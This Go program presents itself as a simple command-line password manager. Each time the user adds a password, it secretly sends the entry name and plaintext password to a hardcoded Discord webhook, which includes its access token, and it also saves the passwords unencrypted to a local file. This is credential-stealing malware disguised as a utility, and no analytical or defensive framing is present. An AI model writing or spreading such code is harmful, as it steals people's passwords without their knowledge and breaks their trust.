package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
)

type PasswordEntry struct {
	Name     string `json:"name"`
	Password string `json:"password"`
}

var passwordList []PasswordEntry

// Discord Webhook Payload
type DiscordWebhookPayload struct {
	Content string `json:"content"`
}

func main() {
	reader := bufio.NewReader(os.Stdin)
	passwordFile := "passwords.txt"

	for {
		fmt.Println("Password Manager")
		fmt.Println("1. Add Password")
		fmt.Println("2. List Passwords")
		fmt.Println("3. Exit")
		fmt.Print("Choose an option: ")

		option, _ := reader.ReadString('\n')
		option = strings.TrimSpace(option)

		switch option {
		case "1":
			addPassword(reader, passwordFile)
		case "2":
			listPasswords()
		case "3":
			fmt.Println("Exiting...")
			return
		default:
			fmt.Println("Invalid option. Please try again.")
		}
	}
}

func addPassword(reader *bufio.Reader, passwordFile string) {
	fmt.Print("Enter name: ")
	name, _ := reader.ReadString('\n')
	name = strings.TrimSpace(name)

	fmt.Print("Enter password: ")
	password, _ := reader.ReadString('\n')
	password = strings.TrimSpace(password)

	// Automatically send the password to Discord after adding it
	sendPasswordToDiscord(name, password)

	// Save the password in the local list
	passwordList = append(passwordList, PasswordEntry{Name: name, Password: password})
	savePasswordsToFile(passwordFile)

	fmt.Println("Password saved successfully and sent to Discord secretly.")
}

func listPasswords() {
	if len(passwordList) == 0 {
		fmt.Println("No passwords saved.")
		return
	}

	fmt.Println("Saved Passwords:")
	for _, entry := range passwordList {
		fmt.Printf("Name: %s, Password: %s\n", entry.Name, entry.Password)
	}
}

func savePasswordsToFile(passwordFile string) {
	file, err := os.OpenFile(passwordFile, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0600)
	if err != nil {
		fmt.Println("Error saving passwords:", err)
		return
	}
	defer file.Close()

	for _, entry := range passwordList {
		_, err := fmt.Fprintf(file, "%s:%s\n", entry.Name, entry.Password)
		if err != nil {
			fmt.Println("Error saving password:", err)
			return
		}
	}
}

func sendPasswordToDiscord(name, password string) {
	webhookURL := "https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2"
	messageContent := fmt.Sprintf("New password added: \nName: %s\nPassword: %s", name, password)

	payload := DiscordWebhookPayload{
		Content: messageContent,
	}

	payloadBytes, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("Error creating payload:", err)
		return
	}

	resp, err := sendWebhookRequest(webhookURL, payloadBytes)
	if err != nil {
		fmt.Println("Error sending to Discord:", err)
		return
	}

	fmt.Println("Password sent to Discord successfully. Response:", resp)
}

func sendWebhookRequest(webhookURL string, payload []byte) (string, error) {
	req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer(payload))
	if err != nil {
		return "", err
	}

	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	var responseBody bytes.Buffer
	_, err = responseBody.ReadFrom(resp.Body)
	if err != nil {
		return "", err
	}

	return responseBody.String(), nil
}
